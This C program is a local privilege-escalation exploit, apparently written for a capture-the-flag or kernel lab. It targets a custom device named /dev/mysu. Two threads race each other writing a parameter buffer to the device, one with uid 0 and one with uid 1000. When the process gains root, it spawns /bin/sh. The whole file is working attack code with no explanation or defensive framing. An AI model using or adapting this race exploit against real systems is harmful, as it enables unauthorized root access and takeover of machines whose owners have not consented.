#include <fcntl.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int done = 0;

char user_parameters[] = {
  0xe8, 0x03, 0x00, 0x00,
  0x6e, 0x63, 0x7b, 0x89,
  0x00, 0x40, 0x40, 0x20,
};

void* change_uid_0(void* arg) {
  int fd;

  while (!done) {
    user_parameters[0] = 0;
    user_parameters[1] = 0;

    fd = open("/dev/mysu", O_RDWR);
    write(fd, user_parameters, sizeof(user_parameters));
    close(fd);

    if (getuid() == 0) {
      done = 1;
      system("/bin/sh");
    }
  }
}

void* change_uid_1000(void* arg) {
  int fd;

  while (!done) {
    user_parameters[0] = 0xe8;
    user_parameters[1] = 0x03;

    fd = open("/dev/mysu", O_RDWR);
    write(fd, user_parameters, sizeof(user_parameters));
    close(fd);

    if (getuid() == 0) {
      done = 1;
      system("/bin/sh");
    }
  }
}

int main() {
  pthread_t thread_uid_0;
  pthread_t thread_uid_1000;

  pthread_create(&thread_uid_0, NULL, change_uid_0, NULL);
  pthread_create(&thread_uid_1000, NULL, change_uid_1000, NULL);  

  pthread_join(thread_uid_0, NULL);
  pthread_join(thread_uid_1000, NULL);

  return 0;
}
